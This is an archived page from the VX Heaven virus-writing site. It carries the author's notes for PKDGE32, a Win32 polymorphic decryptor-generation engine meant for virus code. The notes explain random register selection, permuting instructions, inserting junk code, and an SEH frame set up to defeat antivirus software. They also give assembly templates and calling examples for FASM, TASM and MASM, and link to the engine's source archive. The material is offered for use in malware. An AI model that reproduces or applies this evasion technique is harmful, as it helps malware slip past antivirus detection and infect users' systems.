<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> pker's Decryptor Generation Engine for Win32 - Computer virus engines (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="Author's notes    	I wanted to code a polymorphic engine when I first started coding this.  Then I got the idea of generating decrypt code dynamically instead of morphing the original decrypt code.  The generated  decryptor uses random registerz,  with junk code inserted,  and it's  instruction-permutable.  When coding,  I found that the name  'decrypt generation engine'  is more  appropriate than a polymorphic engine, so I renamed it to PKDBE32.  	Generally, the decrypt code looks like the following:                      mov     Rw,offset code2decrypt      ; (1)                    mov     Rz,decrypt_size             ; (2)  decrypt_loop:     xor     byte [Rw],imm8              ; (3)                    inc     Rw                          ; (4)                    dec     Rz                          ; (5)                    jnz     decrypt_loop                ; (6)    	As we can see,  I used Rx, Ry, Rz in the code above, instead of EAX, EBX, ... this  means  the we can use random registerz in the decrypt code.  The engine can  select  random  registerz to generate each instruction.  Meanwhile,  the first 2  instructionz are  permutable,  so the engine will put the 2 instructionz in a random order.  Also,  we know that some of the instructionz can be replaced by other instructionz that performed the same.  For example,  we can use PUSH/POP to replace MOV XXX/XXX, etc.  Last but important, is, the engine will insert junk codez after each instructionz.  	One more thing, the engine setup a SEH frame before the decrypt code in order to fuck some AVsoftz.  And of course,  there're also junk codez between these instructionz.  	The SEH frame's like the following code:    start:            call    setup_seh                   ; (1)                    mov     esp,[esp+8]                 ; (2)                    jmp     end_seh                     ; (3)  setup_seh:        xor     Rx,Rx                       ; (4)                    push    dword [fs:Rx]               ; (5)                    mov     [fs:Rx],esp                 ; (6)                    dec     dword [Rx]                  ; (7)                    jmp     start                       ; (8)  end_seh:          xor     Ry,Ry                       ; (9)                    pop     dword [fs:Ry]               ; (10)                    pop     Rz                          ; (11)    	Then comes the real decrypt code (generated by this engine).  	How to use it?  	This engine can compile with FASM, TASM and MASM, etc.  	When using FASM we can:    decryptor: times 40h      db      90h  crypt_code: ...  crypted_size = $-crypt_code  rng_seed          dd          ?    gen_decrytpor:    mov     edi,decryptor                    mov     esi,rng_seed                    mov     ebx,crypt_code                    mov     ecx,crypted_size                    mov     edx,9ah                    call    __pkdge32    	When using TASM or MASM we should:    decryptor         db      40h dup (90h)  crypt_code: ...  crypted_size = $-crypt_code  rng_seed          dd          ?    gen_decrytpor:    mov     edi,offset decryptor                    mov     esi,offset rng_seed                    mov     ebx,offset crypt_code                    mov     ecx,crypted_size                    mov     edx,9ah                    call    __pkdge32    	One more feature, the engine returns the address of the code2decrypt field in the decryptor,  so we can fix this value after generating the decryptor. This means  we  can replace the code which to be decrypt anywhere after generating the  decrypt  code.  We can replace our code which to be decrypted just after the decryptor, without padding so many NOPz between them :P  	We could code like this:    col_code: times crypted_size+200h    db   0    gen_decrytpor:    mov     edi,col_code                    mov     esi,rng_seed                    mov     ecx,crypted_size                    mov     ebx,12345678h                    mov     edx,12345678h                    call    __pkdge32  fix_address:      mov     esi,edi                    xchg    eax,edi                    stosd                    xchg    esi,edi  copy_code:        mov     esi,crypt_code                    mov     ecx,crypted_size                    rep     movsb    	Well, enjoy it!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"736db3994418a5d1a7f6111c9a83667200b7c861-1498757938-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/vx.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"> [<a href="/vx.php?id=ep05">Previous</a>] [<a href="/vx.php?id=eidx">Index</a>] [<a href="/vx.php?id=ep14">Next</a>] <h1> pker's Decryptor Generation Engine for Win32</h1><p><strong>Author: pker</strong></p><p><strong>Author's notes</strong></p>
<blockquote>
<p>I wanted to code a polymorphic engine when I first started coding this. Then I got the idea of generating decrypt code dynamically instead of morphing the original decrypt code. The generated decryptor uses random registerz, with junk code inserted, and it's instruction-permutable. When coding, I found that the name 'decrypt generation engine' is more appropriate than a polymorphic engine, so I renamed it to PKDBE32.</p>
<p>Generally, the decrypt code looks like the following:</p>
<pre class="source">
                  mov     Rw,offset code2decrypt      ; (1)
                  mov     Rz,decrypt_size             ; (2)
decrypt_loop:     xor     byte [Rw],imm8              ; (3)
                  inc     Rw                          ; (4)
                  dec     Rz                          ; (5)
                  jnz     decrypt_loop                ; (6)
</pre>
<p>As we can see, I used Rx, Ry, Rz in the code above, instead of EAX, EBX, ... this means the we can use random registerz in the decrypt code. The engine can select random registerz to generate each instruction. Meanwhile, the first 2 instructionz are permutable, so the engine will put the 2 instructionz in a random order. Also, we know that some of the instructionz can be replaced by other instructionz that performed the same. For example, we can use PUSH/POP to replace MOV XXX/XXX, etc. Last but important, is, the engine will insert junk codez after each instructionz.</p>
<p>One more thing, the engine setup a SEH frame before the decrypt code in order to fuck some AVsoftz. And of course, there're also junk codez between these instructionz.</p>
<p>The SEH frame's like the following code:</p>
<pre class="source">
start:            call    setup_seh                   ; (1)
                  mov     esp,[esp+8]                 ; (2)
                  jmp     end_seh                     ; (3)
setup_seh:        xor     Rx,Rx                       ; (4)
                  push    dword [fs:Rx]               ; (5)
                  mov     [fs:Rx],esp                 ; (6)
                  dec     dword [Rx]                  ; (7)
                  jmp     start                       ; (8)
end_seh:          xor     Ry,Ry                       ; (9)
                  pop     dword [fs:Ry]               ; (10)
                  pop     Rz                          ; (11)
</pre>
<p>Then comes the real decrypt code (generated by this engine).</p>
<p><strong>How to use it?</strong></p>
<p>This engine can compile with FASM, TASM and MASM, etc.</p>
<p>When using FASM we can:</p>
<pre class="source">
decryptor: times 40h      db      90h
crypt_code: ...
crypted_size = $-crypt_code
rng_seed          dd          ?

gen_decrytpor:    mov     edi,decryptor
                  mov     esi,rng_seed
                  mov     ebx,crypt_code
                  mov     ecx,crypted_size
                  mov     edx,9ah
                  call    __pkdge32
</pre>
<p>When using TASM or MASM we should:</p>
<pre class="source">
decryptor         db      40h dup (90h)
crypt_code: ...
crypted_size = $-crypt_code
rng_seed          dd          ?

gen_decrytpor:    mov     edi,offset decryptor
                  mov     esi,offset rng_seed
                  mov     ebx,offset crypt_code
                  mov     ecx,crypted_size
                  mov     edx,9ah
                  call    __pkdge32
</pre>
<p>One more feature, the engine returns the address of the code2decrypt field in the decryptor, so we can fix this value after generating the decryptor. This means we can replace the code which to be decrypt anywhere after generating the decrypt code. We can replace our code which to be decrypted just after the decryptor, without padding so many NOPz between them :P</p>
<p>We could code like this:</p>
<pre class="source">
col_code: times crypted_size+200h    db   0

gen_decrytpor:    mov     edi,col_code
                  mov     esi,rng_seed
                  mov     ecx,crypted_size
                  mov     ebx,12345678h
                  mov     edx,12345678h
                  call    __pkdge32
fix_address:      mov     esi,edi
                  xchg    eax,edi
                  stosd
                  xchg    esi,edi
copy_code:        mov     esi,crypt_code
                  mov     ecx,crypted_size
                  rep     movsb
</pre>
<p>Well, enjoy it!</p>
</blockquote>
<br clear="all"/><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/vx.php?id=ep13';</script><a href="/vx.php?id=ep13#disqus_thread">Comments</a><br/><div style="float:left;"><div style="float: left;"><strong>Download</strong></div><br clear="all"/><table cellspacing="0" cellpadding="0" border="1"><tr bgcolor="#aaa999"><th>&nbsp;</th><th>Filename</th><th>Size</th><th>Description</th><th>Date</th><th>&nbsp;</th></tr><tr bgcolor="#cccbbb"><td><form class="fr" method="post" action="/file.php"><input type="image" src="/img/dl.gif" alt="Download"/><input type="hidden" name="file" value="cGxlL3BrZGdlMzIuemlw"/></form></td><td><a name="f1393"></a><small><a href="/dl/ple/pkdge32.zip">pkdge32.zip</a></small></td><td><small>5956</small></td><td><small>PKDGE32</small></td><td><small>Jan 2005</small></td><td><small style="float: right; font-family: fixed;">MD5 sum 990206d05ecf6492a2d70fbcb5c73853</small></td></tr></table></div><br clear="all"/><br/><div class="s2">
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/vx.php?lang=de&amp;id=ep13">de</a><a href="/vx.php?lang=en&amp;id=ep13">en</a><a href="/vx.php?lang=es&amp;id=ep13">es</a><a href="/vx.php?lang=it&amp;id=ep13">it</a><a href="/vx.php?lang=fr&amp;id=ep13">fr</a><a href="/vx.php?lang=pl&amp;id=ep13">pl</a><a href="/vx.php?lang=ru&amp;id=ep13">ru</a><a href="/vx.php?lang=ua&amp;id=ep13">ua</a></div>
</body>
</html>
